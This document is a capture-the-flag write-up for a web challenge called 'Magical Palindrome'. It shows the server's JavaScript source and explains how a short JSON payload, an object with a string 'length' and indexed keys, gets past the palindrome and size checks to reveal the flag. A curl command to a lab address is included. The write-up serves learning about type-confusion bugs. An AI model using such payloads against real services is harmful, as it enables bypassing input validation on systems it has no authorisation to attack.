---
date created: Wednesday, November 19th 2025, 12:37:22 pm
date modified: Wednesday, November 19th 2025, 2:27:27 pm
---

# Magical Palindrome:

**Challenge Description:**
```plaintext
In Dumbledore's absence, Harry's memory fades, leaving crucial words lost. Delve into the arcane world, harness the power of JSON, and unveil the hidden spell to restore his recollection. Can you help harry find a path to salvation?
```
## Initial Overview:
You are given a web interface, if you input a a palindromic number (e.g. 1001), you would get the message: `Tootus Shortus`

Looking within the provided `index.mjs` file, we can see the following code:
```JavaScript
import {serve} from '@hono/node-server';
import {serveStatic} from '@hono/node-server/serve-static';
import {Hono} from 'hono';
import {readFileSync} from 'fs';

const flag = readFileSync('/flag.txt', 'utf8').trim();

const IsPalinDrome = (string) => {
	if (string.length < 1000) {
		return 'Tootus Shortus';
	}

	for (const i of Array(string.length).keys()) {
		const original = string[i];
		const reverse = string[string.length - i - 1];

		if (original !== reverse || typeof original !== 'string') {
			return 'Notter Palindromer!!';
		}
	}

	return null;
}

const app = new Hono();

app.get('/', serveStatic({root: '.'}));

app.post('/', async (c) => {
	const {palindrome} = await c.req.json();
	const error = IsPalinDrome(palindrome);
	if (error) {
		c.status(400);
		return c.text(error);
	}
	return c.text(`Hii Harry!!! ${flag}`);
});

app.port = 3000;

serve(app);
```

## Code Analysis:
- `IsPalinDrome`
	- Checks if a string is greater than 1000 characters
	- Checks if the string is a palindrome by comparing the first and last character.
	- Returns an error message if these conditions are not met, otherwise returns `null` and the if block will accept the value.

So we should be able to get the flag, if we submit a palindrome number that is greater than 1000 characters, as we will avoid the error messaging, meaning the error block will not be active and the flag will be returned to us.

## Building Our Palindrome:

We can build a palindrome in bash using the following:
```Bash
# Create a palindrome of 1001 ones
printf '1%.0s' {1..1001}
```

When submitting this though, we get an error that our string is too large:
```HTML
<html> <head><title>413 Request Entity Too Large</title></head> <body> <center><h1>413 Request Entity Too Large</h1></center> <hr><center>nginx/1.22.1</center> </body> </html>
```

Looking within the `nginx.conf` file, we see that the maximum body size is 75 bytes. So a string of 1001 ones would be too large.

```conf
server {
        listen 80;
        server_name 127.0.0.1;
		client_max_body_size 75;
		...SNIP...	
}
```

The task refers to JSON as a way of finding the spell, hinting us towards using JSON rather than a regular string input, so how would you format this request within a JSON to gain access to the flag?
## Requests Using cURL:

Instead of sending requests via the web interface, we can do it via cURL:
```JavaScript
app.post('/', async (c) => {
	const {palindrome} = await c.req.json();
```

We can see that the server is expecting a JSON POST request, we can replicate our earlier test using the following within `payload.json`:
```JSON
{
  "palindrome": "1001"
}
```

So we can send a request using `curl` instead:
```Bash
curl -v POST http://94.237.58.137:57697/ \
  -H "Content-Type: application/json" \
  -d @payload.json
```

Where `payload.json` is our JSON payload.
## Constructing a Valid Payload:

**Requirements:**
- Length must be greater than 1000
- Payload must be less than 75 bytes.
- Payload must be string or interpreted as a string.

```JSON
// Our payload.json
{"palindrome":{"length":"1001","0":"a","1000":"a"}}
```

This works as:
- Length is set to 1001, bypassing the "Tootus Shortus"
- Because of how the code: `Array(<string>)` operates, you generate an array with one element "1001".
	- This means, that the loop through the palindrome only loops once, as the length is 1.
- Because the program code only checks the first and last value, we can set the value of our array..
	- `string[0]` = a
	- `string[1000]` = a
- So we bypass the "Notter Palindromer!!" check and receive the flag.

**Flag:**
```Plaintext
Hii Harry!!! HTB{Lum0s_M@x!ma} 
```